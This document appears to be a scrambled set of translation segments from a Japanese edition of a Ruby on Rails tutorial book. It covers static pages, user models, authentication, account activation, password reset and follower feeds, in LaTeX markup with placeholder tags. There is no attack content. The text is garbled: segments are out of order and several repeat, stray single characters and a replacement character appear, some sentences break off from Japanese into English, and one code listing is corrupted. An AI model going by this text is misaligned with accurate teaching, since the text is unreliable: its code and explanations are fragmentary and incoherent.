変更結果をリスト\ref{code:home_root_route}に示します。ここでは、リスト{p2}の{3}get{/3}ルールを以下のコードに置き換えています。
{0}図3.7 {/0}{1}ルートURLにアクセスするとHomeページが表示される{/1}
次にmasterブランチに移動し、\ref{sec:git_commands}{p2}と同じ要領で差分をマージします。
基本タイトルを含めたStaticPagesコントローラのテスト GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
これを行うには\href{https://github.com/metaskills/mini_backtrace}{\texttt{mini_backtrace}} gem (リスト\ref{code:gemfile_sample_app}) と\emph{backtrace silencer}を組み合わせます。
Guardは、ファイルシステムの変更を監視し、たとえば\kode{static_pages_test.rb}ファイルなどを変更すると自動的にテストを実行してくれるツールです。
{0}図3.9{/0} {1}ファイルナビゲーターにある (あまり目立たない) ギアのアイコン{/1}
{0}図3.10 {/0}{1}ファイルナビゲーター内の隠しファイルを表示する{/1}
{0}図3.11 {/0}{1}隠れている\kode{.gitignore}ファイルを表示する{/1}
  end
リスト{p0}の{2}hello{/2}アクションを書き換え、「Hello, world!」の代わりに「hola, mundo!」と表示されるようにしてみましょう。
この問題の修正するにはとてつもなく複雑な正規表現を使う必要がありますが、これは演習問題に回します ({0}{1}6.{/1}5{/0})。
\chapter{Toyアプリケーション} % (fold)<n>\label{cha:a_toy_app}<n><n>
このコードはリスト\ref{code:hello_action_redux}で使用されていました。もうひとつ、
続いてこの変更をコミットし、Herokuにプッシュします。
      create  app
      create  app
selfを省略した結果をリスト\ref{code:first_migration}に示します。
これはリスト\ref{code:rails_routes}で使用されていました。
これはリスト\ref{code:demo_microposts_controller}で使用されていました。
\chapter{ユーザーの更新・表示・削除} % (fold)<n>\label{cha:updating_showing_and_deleting_users}<n><n>
まずはユーザーが自分のプロファイルを自分で更新できるようにします。ここで早速{0}{1}第8章{/1}{/0}で実装した認証用のコードを使いますが、これは認可モデルについて説明する自然なキッカケになります。
{0}{1}第8章{/1}{/0}の認証 (authentication) システムを使えば、\emph{before_action}を使用してこれを行えます。
このコードがリスト\ref{code:signup_form}と極めて似通っていることに注目してください。重複が多いということは、それらのコードの繰り返しをパーシャルにまとめることができるということです。パーシャルにまとめる作業は演習の課題 (\ref{sec:exercises_edit_form}) に回します。
これはリスト\ref{code:user_edit_view}で使用されていました。
これはリスト\ref{code:new_edit_partial}で使用されていました。
{0}{1}第8章{/1}{/0}で認証システムを構築したことで、認可のためのシステムを実装する準備もできました。
(このコードのテストは\ref{sec:exercises_friendly_forwarding}の演習とします)。
この節では、いよいよ\href{http://www.dictionary.com/browse/penultimate}{最後から2番目の}ユーザーアクションである\kode{index}アクションを追加しましょう。このアクションは、\emph{すべての}ユーザーを一覧表示します。
リスト\ref{code:user_index_view}では、\ref{code:gravatar_option_redux}の演習のリスト\ref{sec:exercises_a_gravatar_image}の結果を利用しています。これは、Gravatarヘルパーにデフォルト以外のサイズを指定するオプションを渡します。
この演習をまだやっていない場合は、リスト\ref{code:gravatar_option_redux}に従ってUsersヘルパーファイルを更新してから先に進んでください。
このコードはリスト\ref{code:index_final_refactoring}で使用されていました。もうひとつ、
この問題は重大であるため、編集可能になってはならない属性に対するテストを作成することをぜひともお勧めします。\kode{admin}属性のテストについては演習に回します (\ref{sec:exercises_administrative_users})。
\chapter{ユーザーのマイクロポスト}<n>\label{cha:user_microposts}<n><n>
これはリスト\ref{code:micropost_model}で使用されていました。
これはリスト\ref{code:generate_micropost_model}で使用されていました。
これはリスト\ref{code:micropost_user_id_validation}で使用されていました。
これはリスト\ref{code:micropost_validity_test}で使用されていました。
selfを省略した結果をリスト\ref{code:micropost_validations_tests}に示します。
リスト\ref{code:user_profile_test}ではマイクロポストの投稿数をチェックするために、\kode{{1}第10章{/1}}の演習(\ref{cha:password_reset})で紹介した{4}response.body{/4}を使っています。
\kode{if}-\kode{else}分岐を使用してコードを書き分けている点が少し汚いですが、このコードのクリーンアップは演習に回すことにします (\ref{sec:exercises_creating_microposts})。
(次章で完全なフィードを実装するため) 今回は{p0}で紹介した{2}where{/2}メソッドでこれを実現します。{2}Micropost{/2}モデルに変更を加えた結果を、リスト\ref{code:proto_status_feed}に示します
画像アップロードに対するテストは、演習に回します (\ref{sec:exercises_basic_image_upload})。
これはリスト\ref{code:skip_resize_initializer}で使用されていました。
これはリスト\ref{code:generate_user_mailer}で使用されていました。
上のコードが動作するために必要な�パスワード再設定用メイラーメソッドは、\ref{sec:account_activation_emails}で開発したアカウント有効化用メイラーメソッドとほぼ同じです。
アカウント有効化メールの場合 (\ref{sec:account_activation_emails}) と同様、Railsのメールプレビュー機能でパスワード再設定のメールをプレビューしましょう。
selfを省略した結果をリスト\ref{code:password_reset_mailer_test}に示します。
これはリスト\ref{code:password_reset_mailer_test}で使用されていました。
これはリスト\ref{code:password_reset_update_action}で使用されていました。
(確認のために2時間も待っていられないので、テストにはもうひとつ分岐を追加しますが、これは\ref{sec:exercises_updating_the_reset}の演習に回すことにします)。
これはリスト\ref{code:update_columns}で使用されていました。
リスト\ref{code:sendgrid_config_redux}に示したとおり、本番Webサイトのアドレスを\kode{host}変数に定義する必要もあります。
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
これはリスト\ref{code:account_activations_route}で使用されていました。
このコードはリスト\ref{code:user_model_activation_code}で使用されていました。もうひとつ、
selfを省略した結果をリスト\ref{code:generate_user_mailer}に示します。
selfを省略した結果をリスト\ref{code:cgi_escape}に示します。
リスト\ref{code:account_activation_view_text}やリスト\ref{code:account_activation_view_html}で定義したテンプレートの実際の表示を簡単に確認するために、\emph{メールプレビュー}という裏技を使ってみましょう。Railsでは、特殊なURLにアクセスするとメールのメッセージをその場でプレビューすることができます。メールを実際に送信しなくてもよいので大変便利です。
developmentサーバーを再起動してリスト\ref{code:development_email_settings}の設定を読み込んだら、次は{p2}で自動生成したUserメイラーの{3}プレビューファイル{/3}の更新が必要です (リスト\ref{code:generated_user_mailer_previews})。
selfを省略した結果をリスト\ref{code:test_domain_host}に示します。
これはリスト\ref{code:real_account_activation_test}で使用されていました。
production環境で実際にメール送信する方法については\ref{sec:activation_email_in_production}で説明します。
ここで、有効化トークンとメールをそれぞれ{0}params[:id]{/0}と{0}params[:email]{/0}で参照できる ({p1}) ことを思い出してみましょう。
つまり、上のコードは以下と等価です。
(改良すべき点として、有効化されていないユーザーが表示されないようにする必要もあるのですが、これは\ref{sec:exercises_activation_test_and_refactoring}の課題に回すことにします)。
{0}図12.2{/0} {1}フォローする相手を見つける{/1}
{0}図12.3{/0} {1}ユーザーのプロフィール画面に [Follow] ボタンが表示されている{/1}
{0}図12.4{/0} {1}プロフィールに [Unfollow] ボタンが表示され、フォロワーのカウントが1つ増えた{/1}
{0}図12.5{/0} {1}Homeページにステータスフィードが表示され、フォローのカウントが1増えた{/1}
置き換えた結果を{0}{1}リスト4.3{/1}{/0}に示します。
これはリスト\ref{code:utility_method_tests}で使用されていました。
リスト\ref{code:has_many_following_through_passive_relationships}と違って必要のない\kode{:source}キーをそのまま残しているのは、\kode{has_many :following}との類似性を強調させるためです。
これはリスト\ref{code:sample_relationships}で使用されていました。
24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42,
\href{https://www.codeschool.com/}{Code School}: 非常に多種多様なプログラミングを対話的に学習できるコース
{0}{1}第10章{/1}{/0}では、 メールアドレスが\emph{本当に}有効であることを確かめるために、\emph{アカウントを有効化する}機能をサインアップの手順に追加します。
selfを省略した結果をリスト\ref{code:development_debugger}に示します。
これはリスト\ref{code:signup_form_html}で使用されていました。
(なお、エラーメッセージに対するテストは\ref{sec:exercises_a_test_for_invalid_submission}の演習に残しておきます。)
エラーメッセージが正しく表示されているかどうかについては、演習として残しておきます (\ref{sec:exercises_a_test_for_invalid_submission})。
このコードはリスト\ref{code:post_signup}で使用されていました。もうひとつ、
検索キー
ちなみに、ここにflashのテストも追加しておくとよいでしょう。これは演習として残しておきます (\ref{sec:exercises_a_test_for_valid_submission})。
これはリスト\ref{code:user_create_action}で使用されていました。
これはリスト\ref{code:production_webserver_config}で使用されていました。
selfを省略した結果をリスト\ref{code:procfile}に示します。
\chapter{ゼロからデプロイまで} % (fold)<n>\label{cha:beginning}<n><n>
第\ref{cha:filling_in_the_layout}章から第\ref{cha:password_reset}章にかけて、レイアウト、ユーザーのデータモデル、ユーザー登録認証システムを順に作成し、サンプルアプリケーションの基本的な部分を実装します。
<n><n>    \subsection{前提知識} % (fold)<n>    \label{sec:prerequisites}<n><n>There are no formal prerequisites to this book, and the \emph{
\href{https://www.codeschool.com/}{Code School}: プログラミングを対話的に学習できるコース
Turbolinks
これはリスト\ref{code:installing_rails}で使用されていました。
表示したい文字列を返すアクションを定義したので、今度はデフォルトのページ (図\ref{fig:riding_rails}) の代わりにこのアクションを使用するようRailsに指示します。
Capybaraの文法は以下のような感じです。
これはリスト\ref{code:hello_root_route}で使用されていました。
 基礎に基づいたウェブ開発に重点を置きながら（Railsだけに偏るのではなく）、\rort\は\emph{高度技術力}を学ぶための幅広いスキルを身に付けることができる。(Box~\ref{aside:technical_sophistication}),\footnote{\xkcduse.} そして、高度技術力の主要な理念は \letbd\ チュートリアルから派生しています。\footnote{learnenough.com/story} 特に、この Learn Enough introductory sequence には\rortを読み始める前に知っておくべき適した内容が含まれている。が必須条件のように、例えば、 \lecl、\footnote{learnenough.com/command-line} には（現在のチュートリアルにはない）初心者向けの内容で書かれています。<n><n><n>\begin{aside}<n>\label{aside:technical_sophistication}<n>\heading{Technical sophistication}<n><n>\rort\ は \letbd\ チュートリアルの仲間のような本です。なぜなら、これらのチュートリアルは一つのテーマを元にして書かれたからです。そのテーマは、 \emph{高度技術力}: ハードとソフトスキルを用いることによって、どんなに高度な技術でもこれらのスキル合わせることにより、魔法のように解決出来るように思えることです。 (Figure~\ref{fig:tech_support_cheat_sheet})。 ウェブ開発の中では、プログラミングは必要な高度技術力ですが、それ以外にもアプリのメニューを選択することにより得られる、能力を十分に活用したり、分からないぶぶを
 メッセージを \href{http://lmgtfy.com/}{グーグルしてみたり}、または、諦めて再起動してみたり、っと色々ありあます。<n><n>ウェブアプリには様々な動的機能があります、それらは、高度技術力を成長させるためのきかいにつながります。Railsのウェブ開発では、<n> In the context of Rails web development, some specific examples of technical sophistication include making sure you're using the right Ruby gem versions, running \texttt{bundle install} or \texttt{bundle update}, and restarting the local webserver if something doesn't work. (Don't worry if all this sounds like gibberish; we'll cover everything mentioned here in the course of completing this tutorial.)<n><n>As you proceed through this tutorial, in all likelihood you will occasionally be tripped up by things not immediately working as expected. Although some particularly tricky steps are explicitly highlighted in the text, it is impossible to anticipate all the things that can go wrong. I recommend you embrace these inevitable stumbling blocks as opportunities to work on improving your technical sophistication. Or, as we say in \href{https://www.learnenough.com/command-line-tutorial#aside-speak_geek}{geek speak}: \emph{It's not a bug, it's a feature!}<n><n>\end{aside}<n><n>\begin{figure}<n>\begin{center}<n>\image{images/figures/tech_support_cheat_sheet.png}<n>\end{center}<n>\caption{``\href{https://m.xkcd.com/627/}{Tech Support Cheat Sheet}'' (via \href{http://xkcd.com/}{xkcd}). \label{fig:tech_support_cheat_sheet}}<n>\end{figure}<n><n><n>The \emph{
{0}第{1}5{/1}章{/0}から{2}第{1}10{/1}章{/2}にかけて、レイアウト、ユーザーのデータモデル、ユーザー登録/認証システムを順に作成し、サンプルアプリケーションの基本的な部分を実装します。
\href{https://www.codeschool.com/}{Code School}: プログラミングを対話的に学習できるコース
これはリスト\ref{code:rails_command}で使用されていました。
selfを省略した結果をリスト\ref{code:new_readme}に示します。
\chapter{ユーザーのモデルを作成する} % (fold)<n>\label{cha:modeling_users}<n><n>
まとめると、第\ref{cha:modeling_users}章から第\ref{cha:password_reset}章を通して、Railsのログインと認証システムをひととおり開発します。
これはリスト\ref{code:users_migration}で使用されていました。
DELETE
まとめると、{0}{1}第6章{/1}{/0}から{2}{1}第10章{/1}{/2}を通して、Railsのログインと認証システムをひととおり開発します。
リスト\ref{code:valid_user_test}では、シンプルな\kode{assert}メソッドを使ってテストします。\kode{@user.valid?}が\kode{true}を返すと成功し、\kode{false}を返すと失敗します。
これはリスト\ref{code:users_migration}で使用されていました。
DELETE
リスト\ref{code:valid_user_test}では、シンプルな\kode{assert}メソッドを使ってテストします。\kode{@user.valid?}が\kode{true}を返すと成功し、\kode{false}を返すと失敗します。
また、このfixtureは{0}{1}第8章{/1}{/0}になるまで使わない予定なので、今のところはこれらのデータを削除しておき、ユーザー用のfixtureファイルを空にしておきましょう (リスト\ref{code:empty_fixtures})。
メールアドレスの小文字変換に対するテストは演習として残しておきます (\ref{sec:exercises_uniqueness_validation})。
また、入力されたパスワードを使用してユーザーを\emph{認証}する手段と、{1}{2}第8章{/2}{/1}で使用する、ユーザーがサイトにログインできるようにする手段も提供します。
また、このfixtureは{0}{1}第8章{/1}{/0}になるまで使わない予定なので、今のところはこれらのデータを削除しておき、ユーザー用のfixtureファイルを空にしておきましょう (リスト\ref{code:empty_fixtures})。
{0}{1}第8章{/1}{/0}では、この\kode{authenticate}メソッドを使ってログインする方法を解説します。
メールアドレスの小文字変換に対するテストは演習として残しておきます (\ref{sec:exercises_uniqueness_validation})。
{0}{1}第8章{/1}{/0}では、\ref{sec:adding_a_secure_password}の認証システムを利用して、ユーザーが実際にWebサイトにログインできるようにします。
また、入力されたパスワードを使用してユーザーを\emph{認証}する手段と、{1}{2}第8章{/2}{/1}で使用する、ユーザーがサイトにログインできるようにする手段も提供します。
\chapter{レイアウトを作成する} % (fold)<n>\label{cha:filling_in_the_layout}<n><n>In the process of taking a brief tour of Ruby in Chapter~\ref{cha:rails_flavored_ruby}, we learned about including the application stylesheet into the sample application (Section~\ref{sec:motivation}), but (as noted in Section~\ref{sec:css_revisited}) the stylesheet doesn't yet contain any CSS\@. In this chapter, we'll start filling in the custom stylesheet by incorporating a CSS framework into our application, and then we'll add some custom styles of our own.\footnote{
<n><n>%= lang:console<n>\begin{code}<n>$ git checkout -b filling-in-layout<n>\end{code}<n><n>    \subsection{ナビゲーション} % (fold)<n>    \label{sec:adding_to_the_layout}<n><n>As a first step toward adding links and styles to the sample application, we'll 
これはリスト\ref{code:rails_default_head}で使用されていました。
アセットを上記の論理的な場所へ配置すれば、\emph{マニフェストファイル}を使用して、それらをどのように1つのファイルにまとめるのかをRailsに指示することができます。なお、実際にまとめるのは\href{https://github.com/rails/sprockets}{Sprockets} gemが行います。
以下の行は、
({0}{1}第8章{/1}{/0}で本格的に実装します)。
たとえばルートURLを定義すると、\kode{root_path}や\kode{root_url}といったメソッドを通してURLを参照することができます。ちなみに前者はルートURL以下の文字列を、後者は完全なURLの文字列を返します。
selfを省略した結果をリスト\ref{code:static_page_routes_test}に示します。
これはリスト\ref{code:static_page_routes_test}で使用されていました。
selfを省略した結果をリスト\ref{code:users_controller_test_signup_route}に示します。
signupページへのテストは演習に回すことにします (\ref{sec:exercises_rails_routes})。
これで、少なくともサインインのルートを追加するまでの間、リンクと名前付きルートが完成しました({0}{1}第8章{/1}{/0})。
これはリスト\ref{code:layout_links_test_signup_full_title_helper}で使用されていました。
{0}図12.7{/0} {1}能動的関係をとおしてフォローしているユーザーを取得する模式図{/1}
rails-flavored-ruby
Ruby APIには高濃縮の情報が詰まっています (少々濃厚\emph{すぎる}とも言えます)。たとえば、Rubyの文字列の詳細を知りたい場合は、Ruby APIエントリの\kode{String}クラスを参照すればよいのです。
上の説明で気付いた方もいると思いますが、2番目の\kode{return}は実はなくてもかまいません。関数中の最後に置かれた式 (この場合は \kode{"The string is nonempty."}) は、\kode{return}キーワードがなくても暗黙で値を返すためです。ここでは、両方に\kode{return}を使用する方が見た目の対称性が保たれるので好ましいと言えます。
これはリスト\ref{code:palindrome_if}で使用されていました。
リスト\ref{code:palindrome_tester}のとき
このコードは、{p0}や\ref{sec:mvc_in_action}でも説明したように、{3}@name{/3}および{3}@email{/3}{4}インスタンス変数{/4}について、取り出し(get) と割り当て(set) を行う "ゲッター" と "セッター" というメソッドをそれぞれ作成します。
<n>\end{code}<n><n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:rails_flavored_ruby_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n><n>\item 
\chapter{ほぼ静的なページの作成}<n>\label{cha:static_pages}<n><n>
これはリスト\ref{code:sample_app_readme}で使用されていました。
これは、以下のためのサンプルアプリケーションです。
実例を使ってRailsを学ぼう
このコードはリスト\ref{code:hello_action_redux_2}で使用されていました。もうひとつ、
開発中に\href{https://en.wiktionary.org/wiki/SNAFU}{袋小路}に迷い込んでしまった場合でも、これらの機能を使えば元の状態を復元できます。
\href{http://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods}{HTTP} (HyperText Transfer Protocol) には4つの基本的な操作があり、それぞれ\texttt{GET}、\texttt{POST}、\texttt{PATCH}、\texttt{DELETE}という4つの動詞に対応づけられています。
このコードはリスト\ref{code:raw_home_view}で使用されていました。もうひとつ、
これは、Railsの知識が無くてもHomeページやHelpページを修正できることを意味しています。以下のリスト\ref{code:custom_home_page}やリスト\ref{code:custom_help_page}がその一例です。
\label{fig:custom_help_page}}<n>\end{figure}<n><n>% subsection custom_static_pages (end)<n><n>  % section static_pages (end)<n><n><n>  \section{テストから始める} % (fold)<n>  \label{sec:getting_started_with_testing}<n><n>
The action 'about' could not be found for StaticPagesController
/tmp
さらにありがたいことに、base64はURLを安全にエスケープするためにも用いられる (\kode{urlsafe\_base64}という名前のメソッドがあることからもわかります) ので、base64を採用すれば、{1}第{2}10{/2}章{/1}でアカウントの有効化のリンクやパスワードリセットのリンクでも同じトークンジェネレータを使用できるようになります。
  >> 1.year.from_now
  >> 10.weeks.ago
上の説明に基いて、ダイジェストトークンをThe above discussion suggests putting the digest–token comparison into an \kode{authenticated?}
ところで、この\kode{authenticated?}メソッド (リスト\ref{code:authenticated_p}) は記憶ダイジェストと強く結びついていますが、実は他の様々な用途にも応用できます。{3}第{2}10{/2}章{/3}ではこのメソッドを一般化してみます。
このコードはリスト\ref{code:destroy_forget}で使用されていました。もうひとつ、
このコードはリスト\ref{code:authenticated_p_fixed}で使用されていました。もうひとつ、
これはリスト\ref{code:log_in_function}で使用されていました。
これはリスト\ref{code:test_helper_log_in}で使用されていました。
この課題は大して難しくないので、\ref{sec:exercises_testing_the_remember_me_box}の演習に回すことにします。さしあたって、今は関連するcookiesが\kode{nil}であるかどうかだけをチェックすればよいことにします。
これはリスト\ref{code:remember_me_test}で使用されていました。
さらに申し上げると、この種の永続的セッションを手動で確認するのは非常に面倒なので、\kode{current\_user}をリファクタリングするのであれば ({1}第{2}10{/2}章{/1}で行う予定です) 同時にテストも作成しておくことが重要です。
実際、上のように書いても動作します。しかし、\ref{sec:exercises_layout_link_tests}で簡単に触れたように、アサーション\kode{assert_equal}の引数は、\emph{期待する値}、\emph{実際の値}の順序で書くのがルールになっています。
{0}図12.8{/0} {1}Relationshipデータモデル{/1}
{0}表12.1{/0} {1}ユーザーと能動的関係の関連付けによって使えるようになったメソッドのまとめ ({/1}
{0}Listing 12.4:{/0} <n><n>{1}Relationshipモデルのバリデーションをテストする{2}{/2} {3}test/models/relationship_test.rb{/3}{/1}
これはリスト\ref{code:signup_form}で使用されていました。
{0}図12.9{/0} {1}Relationshipモデルのカラムを入れ替えて作った、フォロワーのモデル{/1}
{0}図12.10{/0} {1}統計情報パーシャルのモックアップ{/1}
{0}表12.2{/0} {1}カスタムルールで提供するリスト\ref{code:following_followers_actions_routes}のRESTfulルート{/1}
{0}図12.11{/0} {1}Homeページにフォロー関連の統計情報を表示する{/1}
これを行うために、リスト{p0}の{2}hidden_field_tag{/2}メソッドを使用します。このメソッドは 以下のフォームのHTMLを生成します。
{0}図12.13{/0} {1}プロフィール画面 (\href{http://localhost:3000/users/5}{/users/5}) に [Unfollow] ボタンが表示されている{/1}
{0}図12.14{/0} {1}フォローしているユーザー用ページのモックアップ{/1}
{0}図12.15{/0} {1}ユーザーのフォロワー用ページのモックアップ{/1}
{0}図12.16{/0} {1}現在のユーザーにフォローされているユーザーを表示する{/1}
{0}図12.17{/0} {1}ユーザーのフォロワーを表示する{/1}
{0}図12.18{/0} {1}別のユーザーのフォロワーを表示する{/1}
{0}図12.21{/0} {1}ステータスフィード付きのHomeページのモックアップ{/1}
{0}図12.22:{/0} {1}id 1のユーザーがid 2、7、8、10をフォローしているときのフィード{/1}
先ほどの3つの条件をアサーションに変換して、Userモデル (リスト{p0}) {2}feed{/2}メソッドがあることに注意しながら、更新したUserモデルに対するテストを書いてみましょう。結果をリスト\ref{code:full_feed_test}に示します。
{0}{1}第11章{/1}{/0}ではただのプロトタイプでしたが (図\ref{fig:home_with_proto_feed})、リスト\ref{code:feed_final}の実装によって、Homeページで完全なフィードが表示できていることがわかります (図\ref{fig:home_page_with_feed})。
{0}図12.23:{/0} {1}Homeページで動作するステータスフィード{/1}
{0}図12.24:{/0} {1}本番環境で動作するステータスフィード{/1}
フィードのHTMLをテストする GREEN{2}{3}{/3}{3}{4}{/4}{/3}{3}{/3}{/2}
r
a
f
し
 on
さらに、
Railsだけでしか使えない基礎的な知識に基づくのではなく、
ウェブ開発
の基礎を学ぶことを重点とし、
高度な技術
をテーマ
書かれた
その中でも、Learn Enough のイントロダクションでは、\rortで必要に前提条件の内容がある。
例えば
ith
「熟練」というものについて
Webアプリケーションには動的な部品がたくさんあるので、熟練した技術を身に付けるには十分です。
 custom_helpers (end)<n><n>  % section motivation (end)<n><n>  \section{文字列(string)とメソッド} % (fold)<n>  \label{sec:strings_and_methods}<n><n>
{puts}) a string consisting of the city and state separated by a comma and as space, as in ``Los Angeles, CA''.<n>%= <span class='exercise' id='ex-768a74'></span><n><n>  \item Repeat the previous exercise but with the city and state separated by a tab character.<n>%= <span class='exercise' id='ex-54fc65'></span><n><n>  \item What is the result if you replace double quotes with single quotes in the previous exercise?<n>%= <span class='exercise' id='ex-4820a5'></span><n>\end{enumerate}<n><n>      \subsection{オブジェクトとメッセージ受け渡し} % (fold)<n>      \label{sec:objects_and_message_passing}<n><n>
{code:palindrome_if}? How does it change if you reassign the variable~\kode{s} to the string ``\href{http://www.dictionary.com/browse/onomatopoeia}{onomatopoeia}''? \emph{Hint}: Use up-arrow to retrieve and edit previous commands<n>%= <span class='exercise' id='ex-519870'></span><n>\end{enumerate}<n><n>\begin{codelisting}<n>\label{code:palindrome_if}<n>\codecaption{A simple palindrome test.}<n>%= lang:irb<n>\begin{code}<n>>> puts "It's a palindrome!" if s == s.reverse<n>\end{code}<n>\end{codelisting}<n><n>      \subsection{メソッドの定義} % (fold)<n>      \label{sec:method_definitions}<n><n>
{enumerate}<n><n>\begin{codelisting}<n>\label{code:palindrome_tester}<n>\codecaption{A simple tester for palindromes.}<n>%= lang:irb<n>\begin{code}<n>>> def palindrome_tester(s)<n>>>   if FILL_IN<n>>>     puts "It's a palindrome!"<n>>>   else<n>>>     puts "It's not a palindrome."<n>>>   end<n>>> end<n>\end{code}<n>\end{codelisting}<n><n>    \subsection{titleヘルパー、再び} % (fold)<n>    \label{sec:back_to_the_title_helper}<n><n>We are now in a position to understand the \kode{full\_title} helper from Listing~\ref{code:title_helper},\footnote{
{a} through \kode{z}? What about the same range reversed? \emph{Hint}: In both cases you will have to convert the range to an array.<n>%= <span class='exercise' id='ex-5e13ce'></span><n>\end{enumerate}<n><n>    \subsection{ブロック} % (fold)<n>    \label{sec:blocks}<n><n>
ection blocks (end)<n><n><n>    % subsection arrays_and_ranges (end)<n><n>    \subsection{ハッシュとシンボル} % (fold)<n>    \label{sec:hashes_and_symbols}<n><n>
s the value of the following expression?<n>%= <span class='exercise' id='ex-bc0dd6'></span><n><n>  %= lang:ruby<n>  \begin{code}<n>  { "a" => 100, "b" => 200 }.merge({ "b" => 300 })<n>  \end{code}<n>\end{enumerate}<n><n>    % subsection hashes_and_symbols (end)<n><n>    \subsection{CSS、再び} % (fold)<n>    \label{sec:css_revisited}<n><n>
 % subsection css_revisited (end)<n><n>  % section other_data_structures (end)<n><n>  \section{Ruby におけるクラス} % (fold)<n>  \label{sec:ruby_classes}<n><n>
uctor using the \kode{Range} class and the \kode{new} method? \emph{Hint}: \kode{new} takes two arguments in this context.<n>%= <span class='exercise' id='ex-73158e'></span><n><n>  \item Confirm using the \kode{==} operator that the literal and named constructors from the previous two exercises are identical.<n>%= <span class='exercise' id='ex-4d8c3d'></span><n><n>\end{enumerate}<n><n>    % subsection constructors (end)<n><n>    \subsection{クラス継承} % (fold)<n>    \label{sec:a_class_of_our_own}<n><n>
end{enumerate}<n><n>    % subsection a_class_of_our_own (end)<n><n>    \subsection{組込みクラスの変更} % (fold)<n>    \label{sec:modifying_built_in_classes}<n><n>
f shuffle<n>>>     self.?('').?.?<n>>>   end<n>>> end<n>>> "foobar".shuffle<n>=> "borafo"<n>\end{code}<n>\end{codelisting}<n>    % subsection modifying_built_in_classes (end)<n><n>      \subsection{コントローラクラス} % (fold)<n>      \label{sec:a_controller_class}<n><n>
te}<n><n>      % subsection a_controller_class (end)<n><n><n>    \subsection{ユーザークラス} % (fold)<n>    \label{sec:a_user_class}<n><n>
ection a_user_object (end)<n><n>  % section ruby_classes (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:conclusion}<n><n>
}}<n>\end{figure}<n><n>    % subsection header (end)<n><n>    \subsection{BootstrapとカスタムCSS} % (fold)<n>    \label{sec:custom_css}<n><n>
 to hide all images.}<n>%= lang:css<n>\begin{code}<n>img {<n>  display: none;<n>}<n>\end{code}<n>\end{codelisting}<n><n><n>    % subsection custom_css (end)<n><n>    \subsection{パーシャル (partial)} % (fold)<n>    \label{sec:partials}<n><n>
nder 'layouts/rails_default' %><n>    <%= render 'layouts/shim' %><n>  </head><n>  <body><n>    <%= render 'layouts/header' %><n>    <div class="container"><n>      <%= yield %><n>      <%= render 'layouts/footer' %><n>    </div><n>  </body><n></html><n>\end{code}<n>\end{codelisting}<n><n>    % subsection partials (end)<n><n>  % section header_and_menu (end)<n><n>  \section{SassとAsset Pipeline} % (fold)<n>  \label{sec:sass_and_the_asset_pipeline}<n><n>
<n><n>    \subsection{Asset Pipeline} % (fold)<n>    \label{sec:the_asset_pipeline}<n><n>F
te}<n><n>  % section sass_and_the_asset_pipeline (end)<n><n>  \section{レイアウトのリンク} % (fold)<n>  \label{sec:layout_links}<n><n>Now that we've finished a site layout with decent styling, it's time to start filling in the links we've stubbed out with \kode{'\#'}. 
 to: 'static_pages#contact'<n>end<n>\end{code}<n>\end{codelisting}<n><n>    % subsection rails_routes (end)<n><n>    \subsection{名前付きルート} % (fold)<n>    \label{sec:named_routes}<n><n>
e' id='ex-98fcd3'></span><n><n>\end{enumerate}<n><n>    % subsection named_routes (end)<n><n>\subsection{リンクのテスト} % (fold)<n>\label{sec:layout_link_tests}<n><n>
d='ex-b87c82'></span><n>\end{enumerate}<n><n>    % subsection users_controller (end)<n><n>    \subsection{ユーザー登録用URL} % (fold)<n>    \label{sec:signup_url}<n><n>
exercise' id='ex-cb38fe'></span><n>\end{enumerate}<n><n>    % subsection signup_url (end)<n><n>  % section user_signup (end)<n><n>  \section{最後に} % (fold)<n>  \label{sec:layout_conclusion}<n><n>
}<n><n><n>    % subsection database_migrations (end)<n><n>    \subsection{modelファイル} % (fold)<n>    \label{sec:the_model_file}<n><n>
umerate}<n><n>    % subsection the_model_file (end)<n><n>    \subsection{ユーザーオブジェクトを作成する} % (fold)<n>    \label{sec:creating_user_objects}<n><n>
te}<n><n>    % subsection creating_user_objects (end)<n><n>    \subsection{ユーザーオブジェクトを検索する} % (fold)<n>    \label{sec:finding_user_objects}<n><n>
_user_objects (end)<n><n>    \subsection{ユーザーオブジェクトを更新する} % (fold)<n>    \label{sec:updating_user_objects}<n><n>
_user_objects (end)<n><n>  % section user_model (end)<n><n>  \section{ユーザーを検証する} % (fold)<n>  \label{sec:user_validations}<n><n>
te}<n><n>% subsection a_validity_test (end)<n><n>    \subsection{存在性を検証する} % (fold)<n>    \label{sec:presence_validation}<n><n>
n><n>\end{enumerate}<n><n>    \subsection{長さを検証する} % (fold)<n>    \label{sec:length_validation}<n><n>
umerate}<n><n>    % subsection length_validation (end)<n><n>    \subsection{フォーマットを検証する} % (fold)<n>    \label{sec:format_validation}<n><n>
d<n>\end{code}<n>\end{codelisting}<n><n>      % subsection format_validation (end)<n><n>    \subsection{一意性を検証する} % (fold)<n>    \label{sec:uniqueness_validation}<n><n>
 @user.reload.email<n>  end<n>end<n>\end{code}<n>\end{codelisting}<n><n>\begin{codelisting}<n>\label{code:downcase_bang}<n>\codecaption{An alternate callback implementation. \passing \\ \filepath{app/models/user.rb}}<n>%= lang:ruby, options: "hl_lines": [2]<n>\begin{code}<n>class User < ApplicationRecord<n>  before_save { email.downcase! }<n>  validates :name, presence: true, length: { maximum: 50 }<n>  VALID_EMAIL_REGEX = /\A[\w+\-.]+@[a-z\d\-.]+\.[a-z]+\z/i<n>  validates :email, presence: true, length: { maximum: 255 },<n>                    format: { with: VALID_EMAIL_REGEX },<n>                    uniqueness: { case_sensitive: false }<n>end<n>\end{code}<n>\end{codelisting}<n><n><n>    % subsection uniqueness_validation (end)<n><n>  % section model_validations (end)<n><n>  \section{セキュアなパスワードを追加する} % (fold)<n>  \label{sec:adding_a_secure_password}<n><n>
te}<n><n>    % subsection creating_and_authenticating_a_user (end)<n><n>  % section adding_a_secure_password (end)<n><n>  \section{最後に}<n>  \label{sec:modeling_users_conclusion}<n><n>
ohtTEcH..."><n>\end{code}<n><n>\subsection{本章のまとめ} % (fold)<n>\label{sec:modeling_users_what_we_learned_in_this_chapter}<n><n>\begin{itemize}<n>\item 
